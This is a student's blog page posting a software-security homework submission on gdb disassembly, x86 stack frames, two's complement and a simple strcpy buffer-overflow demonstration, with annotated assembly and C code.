<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="Try harder">
<meta property="og:type" content="website">
<meta property="og:title" content="Seven&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Seven&#39;s blog">
<meta property="og:description" content="Try harder">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Seven ♂">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"bounceIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Seven's blog</title>
  








<meta name="generator" content="Hexo 4.2.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Seven's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/16/SWS/Submission01_en/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Seven ♂">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.JPG">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Seven's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/05/16/SWS/Submission01_en/" itemprop="url">SWS/Submission01_en</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-16T01:45:24+02:00">
                2020-05-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Submission01-of-SWS"><a href="#Submission01-of-SWS" class="headerlink" title="Submission01 of SWS"></a>Submission01 of SWS</h2><h2 id="Xusong-Wang-3375907"><a href="#Xusong-Wang-3375907" class="headerlink" title="Xusong Wang 3375907"></a>Xusong Wang 3375907</h2><h2 id="Huicheng-Qian-3443114"><a href="#Huicheng-Qian-3443114" class="headerlink" title="Huicheng Qian 3443114"></a>Huicheng Qian 3443114</h2><h2 id="Shkodran-Abdullahu-3466256"><a href="#Shkodran-Abdullahu-3466256" class="headerlink" title="Shkodran Abdullahu 3466256"></a>Shkodran Abdullahu 3466256</h2><p>关闭了所有的优化选项,否则的话想problem 1中的部分变量都会被优化掉.</p>
<p>The order of declaration will determine the order of stack. NOT initialization.</p>
<ul>
<li>When do we need movl rahter than mov : </li>
<li>ebp:frame pointer</li>
<li>ecx: 可能谁需要呢?ecx</li>
</ul>
<h4 id="Problem-1-Disassembling-with-gdb"><a href="#Problem-1-Disassembling-with-gdb" class="headerlink" title="Problem 1: Disassembling with gdb"></a>Problem 1: Disassembling with gdb</h4><ol>
<li>Replace X in Line 5 with the sum of the ASCII codes.</li>
</ol>
<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200502005204664.png" alt="image-20200502005204664"></p>
<ol start="2">
<li>Compiling and disassembing with gdb</li>
</ol>
<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200501212219103.png" alt="image-20200501212219103"></p>
<ol start="3">
<li>Retrieve the assembly code of the main function, the corresponding assembly code are commented.</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x08048344 &lt;+0&gt;:	    lea    0x4(%esp),%ecx	</span><br><span class="line">0x08048348 &lt;+4&gt;:	    and    $0xfffffff0,%esp #这是不可逆的哦,所以之前的东西要保存</span><br><span class="line">0x0804834b &lt;+7&gt;:	    pushl  -0x4(%ecx)		#之前esp上的数据</span><br><span class="line">0x0804834e &lt;+10&gt;:	push   %ebp				</span><br><span class="line">0x0804834f &lt;+11&gt;:	mov    %esp,%ebp		</span><br><span class="line">0x08048351 &lt;+13&gt;:	push   %ecx				#回火, 为什么要存,因为只有他有之前esp的信息了</span><br><span class="line">0x08048352 &lt;+14&gt;:	sub    $0x10,%esp		</span><br><span class="line">0x08048355 &lt;+17&gt;:	movl   $0xf3,-0x10(%ebp);Refer to line5 a&#x3D;0xf3;</span><br><span class="line">												;Move value of a to -0x10@(%ebp)</span><br><span class="line">0x0804835c &lt;+24&gt;:	movl   $0x3,-0xc(%ebp)	;Refer to Line6 b&#x3D;3;</span><br><span class="line">0x08048363 &lt;+31&gt;:	mov    -0xc(%ebp),%eax	;Refer to Line7 temp &#x3D; b;</span><br><span class="line">0x08048366 &lt;+34&gt;:	add    -0x10(%ebp),%eax	;Refer to Line7 temp &#x3D; temp+a;</span><br><span class="line">0x08048369 &lt;+37&gt;:	mov    %eax,-0x8(%ebp)	;Refer to Line7 c &#x3D; temp;</span><br><span class="line">0x0804836c &lt;+40&gt;:	mov    $0x0,%eax		</span><br><span class="line">0x08048371 &lt;+45&gt;:	add    $0x10,%esp</span><br><span class="line">0x08048374 &lt;+48&gt;:	pop    %ecx</span><br><span class="line">0x08048375 &lt;+49&gt;:	pop    %ebp</span><br><span class="line">0x08048376 &lt;+50&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">0x08048379 &lt;+53&gt;:	ret</span><br></pre></td></tr></table></figure>

<h4 id="Problem-2-x86-Assembly-Code-I"><a href="#Problem-2-x86-Assembly-Code-I" class="headerlink" title="Problem 2: x86 Assembly Code (I)"></a>Problem 2: x86 Assembly Code (I)</h4><p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200503091753665.png" alt="image-20200503091753665"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x080483b6 &lt;+0&gt;:		lea    0x4(%esp),%ecx	;copies address esp+4 to ecx</span><br><span class="line">   0x080483ba &lt;+4&gt;:		and    $0xfffffff0,%esp	;alignment</span><br><span class="line">   0x080483bd &lt;+7&gt;:		pushl  -0x4(%ecx)		;push value of @-0x4(%ecx) onto the stack</span><br><span class="line">   0x080483c0 &lt;+10&gt;:	push   %ebp				;save current frame pointer</span><br><span class="line">   0x080483c1 &lt;+11&gt;:	mov    %esp,%ebp		;set %ebp&#x3D;%esp, new frame pointer</span><br><span class="line">   0x080483c3 &lt;+13&gt;:	push   %ecx				;allocate 4 bytes space for local variable</span><br><span class="line">   0x080483c4 &lt;+14&gt;:	sub    $0x14,%esp		;allocate space for local variables</span><br><span class="line">   0x080483c7 &lt;+17&gt;:	movl   $0x0,-0x8(%ebp)	;int x&#x3D; 0</span><br><span class="line">   0x080483ce &lt;+24&gt;:	mov    -0x8(%ebp),%eax	;moves x&#x3D;0 to %eax</span><br><span class="line">   0x080483d1 &lt;+27&gt;:	mov    %eax,(%esp)		;moves x&#x3D;0 @0x0(%esp)</span><br><span class="line">   0x080483d4 &lt;+30&gt;:	call   0x8048374 &lt;myfunction&gt;;call myfunction()</span><br><span class="line">   0x080483d9 &lt;+35&gt;:	add    $0x14,%esp		;esp+0x14</span><br><span class="line">   0x080483dc &lt;+38&gt;:	pop    %ecx				;pop %ecx</span><br><span class="line">   0x080483dd &lt;+39&gt;:	pop    %ebp				;pop %ebp</span><br><span class="line">   0x080483de &lt;+40&gt;:	lea    -0x4(%ecx),%esp	;copies address ecx-4 to esp</span><br><span class="line">   0x080483e1 &lt;+43&gt;:	ret    					;pop %ebp</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of assembler code for function myfunction:</span><br><span class="line">   0x08048374 &lt;+0&gt;:		push   %ebp					;save current frame pointer</span><br><span class="line">   0x08048375 &lt;+1&gt;:		mov    %esp,%ebp			;set %ebp&#x3D;%esp, new frame pointer</span><br><span class="line">   0x08048377 &lt;+3&gt;:		sub    $0x28,%esp			;allocate space for local variables</span><br><span class="line">   0x0804837a &lt;+6&gt;:		movl   $0x2a,-0x4(%ebp)		;some_long:&#x3D; 42</span><br><span class="line">   0x08048381 &lt;+13&gt;:	movl   $0x80484b0,-0xc(%ebp);some_strings[0] &#x3D; &quot;foo&quot;</span><br><span class="line">   0x08048388 &lt;+20&gt;:	movl   $0x80484b4,-0x8(%ebp);some_strings[1] &#x3D; &quot;bar&quot;</span><br><span class="line">   0x0804838f &lt;+27&gt;:	subl   $0x13,-0x4(%ebp)		;some_long -&#x3D; 19;</span><br><span class="line">   0x08048393 &lt;+31&gt;:	mov    -0xc(%ebp),%eax		;%eax:&#x3D;some_strings[0] </span><br><span class="line">   0x08048396 &lt;+34&gt;:	mov    %eax,0xc(%esp)		;mov some_strings[0] @0xc(%esp)</span><br><span class="line">   													;as argument for the &lt;printf&gt;</span><br><span class="line">   0x0804839a &lt;+38&gt;:	mov    0x8(%ebp),%eax		;move argument int a to %eax</span><br><span class="line">   0x0804839d &lt;+41&gt;:	mov    %eax,0x8(%esp)		;move int a @0x8(%esp) for printf</span><br><span class="line">   0x080483a1 &lt;+45&gt;:	mov    -0x4(%ebp),%eax		;move some_long to %eax</span><br><span class="line">   0x080483a4 &lt;+48&gt;:	mov    %eax,0x4(%esp)		;move eax 0x4(%esp for printf</span><br><span class="line">   0x080483a8 &lt;+52&gt;:	movl   $0x80484b8,(%esp)	;pass the address of strng to printf</span><br><span class="line">   0x080483af &lt;+59&gt;:	call   0x80482d8 &lt;printf@plt&gt;;printf</span><br><span class="line">   0x080483b4 &lt;+64&gt;:	leave  						;%esp :&#x3D;ebp%</span><br><span class="line">   0x080483b5 &lt;+65&gt;:	ret    						;pop %ebp</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>



<h4 id="Problem-3-x86-Assembly-Code-II"><a href="#Problem-3-x86-Assembly-Code-II" class="headerlink" title="Problem 3: x86 Assembly Code (II)"></a>Problem 3: x86 Assembly Code (II)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">blub</span><span class="params">()</span></span>;</span><br><span class="line">    blub();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">blub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0x17</span>;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">    b = a - <span class="number">0xf</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Problem-4-Two’s-Complement"><a href="#Problem-4-Two’s-Complement" class="headerlink" title="Problem 4: Two’s Complement"></a>Problem 4: Two’s Complement</h4><p>  Attachment below is the source file of this problem.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;conio.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">print_bin</span><span class="params">(<span class="keyword">int</span> n)</span></span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> s_unsigned;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> s_unsigned_b;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> s_signed;  </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> s_signed_b;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> x;<span class="comment">//  int x[3]=&#123;'X','H','S'&#125;;</span></span><br><span class="line">  x=<span class="string">'X'</span>+<span class="string">'H'</span>+<span class="string">'S'</span>;</span><br><span class="line">  s_unsigned=x%<span class="number">127</span>+<span class="number">128</span>;</span><br><span class="line">  s_signed=x%<span class="number">127</span>+<span class="number">128</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The value of x is %d\n"</span>,x);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The value of s_unsigned is %d\n"</span>,s_unsigned);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The value of s_signed is %d\n"</span>,s_signed);</span><br><span class="line">  print_bin(s_unsigned);</span><br><span class="line">  print_bin(s_signed);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_bin</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="keyword">sizeof</span>(n)*<span class="number">4</span><span class="number">-1</span>; i&gt;=<span class="number">0</span>; i --)<span class="comment">//Attention in ANSI C - sizeof(char) is 1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n&amp;(<span class="number">1</span>&lt;&lt;i))<span class="built_in">printf</span>(<span class="string">"1"</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"0"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>Consuming the representation type of the variables is int, whose size is 16 or 32 bits normally , 16 bits in my case.</p>
<p>The value of x is 243<br>The value of s_unsigned is 244<br>The value of s_signed is 244<br>0000000011110100(Binary representation of s_unsigned )<br>0000000011110100(Binary representation of s_signed )</p>
</li>
<li><p>Consuming the representation type of the variables is  short, whose size is 8 bits normally.</p>
<p>The value of x is 243<br>The value of s_unsigned is 244<br>The value of s_signed is -12<br>11110100(Binary representation of s_unsigned )<br>11110100(Binary representation of s_signed)<br>Unsigned interpretation: $244 = -12 \ mod \ 2^8 = 2^8 - 12$</p>
</li>
</ul>
<h3 id="Problem-5-Buffer-Overflow"><a href="#Problem-5-Buffer-Overflow" class="headerlink" title="Problem 5: Buffer Overflow"></a>Problem 5: Buffer Overflow</h3><p>The result of the given script is shown as below:</p>
<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200504002751333.png" alt="image-20200504002751333"></p>
<p>A string  is printed: undvier</p>
<p>There are several reasons about the solution:</p>
<ol>
<li><p>The strcpy(arg1,arg2) may copy the string from arg2 to arg1, until /0 is detected</p>
<p>part of source code of strcpy()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcpy</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>; src[i] != <span class="string">'\0'</span>; ++i)</span><br><span class="line">    dest[i] = src[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//Ensure trailing null byte is copied</span></span><br><span class="line">  dest[i]= <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In our case </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> foo[] = <span class="string">"zweiundvier\0zig"</span></span><br></pre></td></tr></table></figure>

<p>so only “zweiundvier” are copied in the process of operation</p>
<ol start="2">
<li>buffer2 is too small to capture “zweiundvier”, buffer overflow happens, due to the definition of buffer1, buffer2 and buffer3 are conseqent, “zweiundvier” also cover the data segment of buffer1 and buffer2. And print function show the string until it print \0.</li>
</ol>
</li>
</ol>
<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200504002617049.png" alt="image-20200504002617049"></p>
<p>​        In addition, if we print the buffer2 ,buffer3 , it should be:<br>​        buffer1 =’’ vier’, buffer2 = ‘undvier ‘, buffer3 = ‘zweiundvier’</p>
<p>​     </p>
<h3 id="Problem-6-Stack-Frames"><a href="#Problem-6-Stack-Frames" class="headerlink" title="Problem 6: Stack Frames"></a>Problem 6: Stack Frames</h3><p>Belwo is the disassembled code: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x08048357 &lt;+0&gt;:		lea    0x4(%esp),%ecx</span><br><span class="line">   0x0804835b &lt;+4&gt;:		and    $0xfffffff0,%esp</span><br><span class="line">   0x0804835e &lt;+7&gt;:		pushl  -0x4(%ecx)</span><br><span class="line">   0x08048361 &lt;+10&gt;:	push   %ebp</span><br><span class="line">   0x08048362 &lt;+11&gt;:	mov    %esp,%ebp</span><br><span class="line">   0x08048364 &lt;+13&gt;:	push   %ecx</span><br><span class="line">   0x08048365 &lt;+14&gt;:	sub    $0x18,%esp</span><br><span class="line">   0x08048368 &lt;+17&gt;:	movl   $0x2a,-0x10(%ebp)</span><br><span class="line">   0x0804836f &lt;+24&gt;:	lea    -0x10(%ebp),%eax</span><br><span class="line">   0x08048372 &lt;+27&gt;:	mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048376 &lt;+31&gt;:	movl   $0x17,(%esp)</span><br><span class="line">   0x0804837d &lt;+38&gt;:	call   0x8048344 &lt;do_something&gt;</span><br><span class="line">   0x08048382 &lt;+43&gt;:	add    $0x18,%esp</span><br><span class="line">   0x08048385 &lt;+46&gt;:	pop    %ecx</span><br><span class="line">   0x08048386 &lt;+47&gt;:	pop    %ebp</span><br><span class="line">   0x08048387 &lt;+48&gt;:	lea    -0x4(%ecx),%esp</span><br><span class="line">   0x0804838a &lt;+51&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">Dump of assembler code for function do_something:</span><br><span class="line">   0x08048344 &lt;+0&gt;:		push   %ebp</span><br><span class="line">   0x08048345 &lt;+1&gt;:		mov    %esp,%ebp</span><br><span class="line">   0x08048347 &lt;+3&gt;:		sub    $0x10,%esp	;end here?</span><br><span class="line">   0x0804834a &lt;+6&gt;:		mov    0xc(%ebp),%eax</span><br><span class="line">   0x0804834d &lt;+9&gt;:		mov    (%eax),%eax</span><br><span class="line">   0x0804834f &lt;+11&gt;:	add    0x8(%ebp),%eax</span><br><span class="line">   0x08048352 &lt;+14&gt;:	mov    %eax,-0x8(%ebp)</span><br><span class="line">   0x08048355 &lt;+17&gt;:	leave  </span><br><span class="line">   0x08048356 &lt;+18&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_something</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> * b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c;</span><br><span class="line">  <span class="keyword">int</span> d;</span><br><span class="line"></span><br><span class="line">  c = a + *b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> e;</span><br><span class="line">  <span class="keyword">int</span> f;</span><br><span class="line">  <span class="keyword">int</span> g;</span><br><span class="line"></span><br><span class="line">  e = <span class="number">42</span>;</span><br><span class="line">  </span><br><span class="line">  do_something(<span class="number">23</span>, &amp;e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(gdb) backtrace</span><br><span class="line"><span class="meta">#</span><span class="bash">0  do_something (a=23, b=0xffffcd98) at c-stack-example.c:5</span></span><br><span class="line"><span class="meta">#</span><span class="bash">1  0x08048382 <span class="keyword">in</span> main () at c-stack-example.c:15</span></span><br><span class="line">(gdb) info frame 0</span><br><span class="line">Stack frame at 0xffffcd8c:</span><br><span class="line"> eip = 0x804834a in do_something (c-stack-example.c:5); saved eip = 0x8048382</span><br><span class="line"> called by frame at 0xffffcdb0</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at 0xffffcd84, args: a=23, b=0xffffcd98</span><br><span class="line"> Locals at 0xffffcd84, Previous frame's sp is 0xffffcd8c</span><br><span class="line"> Saved registers:</span><br><span class="line">  ebp at 0xffffcd84, eip at 0xffffcd88</span><br><span class="line">  </span><br><span class="line">(gdb) info frame 1</span><br><span class="line">Stack frame at 0xffffcdb0:</span><br><span class="line"> eip = 0x8048382 in main (c-stack-example.c:15); saved eip = 0xf7e09637</span><br><span class="line"> caller of frame at 0xffffcd8c</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at 0xffffcda8, args: </span><br><span class="line"> Locals at 0xffffcda8, Previous frame's sp at 0xffffcda4</span><br><span class="line"> Saved registers:</span><br><span class="line">  ebp at 0xffffcda8, eip at 0xffffcdac</span><br></pre></td></tr></table></figure>

<p><img src="/home/xusong/.config/Typora/typora-user-images/image-20200504001834021.png" alt="image-20200504001834021"></p>
<p>Ofen used command: </p>
<p>(gdb) break 5  //number of line in  code/c–stack–example.c</p>
<p>(gdb) run</p>
<p>(gdb) backtrace</p>
<p>(gdb) select-frame 0</p>
<p>(gdb) info frame</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
